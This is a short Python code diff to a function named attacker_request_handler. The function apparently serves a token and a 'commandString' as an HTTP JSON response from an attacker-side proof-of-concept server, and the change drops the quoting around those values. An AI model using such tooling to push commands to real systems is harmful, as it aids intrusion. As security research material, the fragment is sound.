@@ -40,8 +40,8 @@ def attacker_request_handler(conn, addr, client_data):
         #        break
         total_data += data
         if b"GET /token" in total_data:
-            data_string = "{\"token\":\"" + client_data.token + "\"," \
-                          "\"commandString\":\"" + client_data.commandString + "\"}"
+            data_string = "{\"token\":" + client_data.token + "," \
+                          "\"commandString\":" + client_data.commandString + "}"
             send_string = "HTTP/1.1 200 OK\r\n" + \
                          "Content-Type: application/json; charset=UTF-8\r\n" + \
                          "Content-Length: " + str(len(data_string)) + "\r\n" + \
